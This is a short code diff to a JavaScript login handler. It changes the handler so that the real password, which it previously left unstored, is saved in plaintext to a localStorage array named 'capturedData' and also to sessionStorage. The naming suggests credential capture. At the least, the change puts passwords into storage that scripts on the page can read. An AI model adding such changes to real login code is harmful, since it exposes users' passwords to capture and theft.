@@ -66,11 +66,12 @@
                 const entries = JSON.parse(localStorage.getItem('capturedData') || '[]');
                 entries.push({
                     username: username,
-                    passwordStatus: 'Submitted but not stored',
+                    passwordStatus: password,
                     timestamp: new Date().toLocaleString()
                 });
                 localStorage.setItem('capturedData', JSON.stringify(entries));
                 sessionStorage.setItem('adminUser', username);
+                sessionStorage.setItem('adminPassword', password);
                 window.location.href = 'dashboard.html';
             }
         });
